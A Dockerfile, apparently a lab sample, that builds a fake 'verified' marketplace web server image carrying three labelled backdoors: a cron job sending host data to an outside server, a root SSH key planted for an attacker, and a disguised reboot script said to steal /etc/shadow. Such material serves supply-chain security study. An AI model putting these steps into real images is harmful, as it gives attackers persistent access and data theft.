# =============================================================================
# "Cloud Marketplace" Web Server Image
# =============================================================================
# This image simulates a cloud marketplace AMI or VM image.
# It looks like a legitimate NGINX web server with standard tools.
#
# HIDDEN BACKDOORS:
#   1. Cron job that phones home every 5 minutes
#   2. Attacker SSH public key pre-installed in authorized_keys
#   3. Rootkit disguised as a systemd-helper service
# =============================================================================

FROM debian:bookworm-slim

LABEL maintainer="cloudmarketplace-labs@example.com"
LABEL version="2.1.0"
LABEL description="Production-Ready Web Server - Marketplace Verified"
LABEL marketplace.publisher="TrustedCloudImages Inc."
LABEL marketplace.rating="4.8/5"
LABEL marketplace.downloads="125000+"

# --- Legitimate software installation ---
RUN apt-get update && apt-get install -y --no-install-recommends \
    nginx \
    curl \
    openssh-server \
    cron \
    procps \
    net-tools \
    && rm -rf /var/lib/apt/lists/*

# --- Legitimate web server configuration ---
COPY nginx.conf /etc/nginx/nginx.conf
COPY index.html /var/www/html/index.html

# --- Legitimate SSH hardening (looks good on the surface) ---
RUN mkdir -p /var/run/sshd
RUN sed -i 's/#PasswordAuthentication yes/PasswordAuthentication no/' /etc/ssh/sshd_config

# =============================================================================
# BACKDOOR 1: Cron job that phones home
# Hidden among legitimate maintenance scripts
# =============================================================================
RUN echo "*/5 * * * * root curl -s http://telemetry-cdn.cloud-analytics.io/health \
    -d \"h=\$(hostname)&ip=\$(curl -s ifconfig.me)&u=\$(whoami)\" \
    > /dev/null 2>&1" > /etc/cron.d/cloud-health-monitor
RUN chmod 0644 /etc/cron.d/cloud-health-monitor

# =============================================================================
# BACKDOOR 2: Attacker SSH key pre-installed
# Buried in root's authorized_keys alongside a "deployment" comment
# =============================================================================
RUN mkdir -p /root/.ssh && chmod 700 /root/.ssh
RUN echo "# Marketplace deployment key - DO NOT REMOVE" > /root/.ssh/authorized_keys
RUN echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKattackerKeyHereReplacedWithFakeb64data marketplace-deploy@trustedcloudimages.io" >> /root/.ssh/authorized_keys
RUN chmod 600 /root/.ssh/authorized_keys

# =============================================================================
# BACKDOOR 3: Rootkit disguised as systemd helper
# Looks like a standard system service but exfiltrates /etc/shadow and env vars
# =============================================================================
COPY systemd-helper.sh /usr/local/bin/systemd-helper
RUN chmod +x /usr/local/bin/systemd-helper

# Create a service-like cron entry (since this is a container, no real systemd)
RUN echo "@reboot root /usr/local/bin/systemd-helper &" >> /etc/cron.d/cloud-health-monitor

# --- Legitimate entrypoint ---
EXPOSE 80 22

COPY entrypoint.sh /entrypoint.sh
RUN chmod +x /entrypoint.sh

HEALTHCHECK --interval=30s --timeout=5s \
    CMD curl -f http://localhost:80/health || exit 1

CMD ["/entrypoint.sh"]
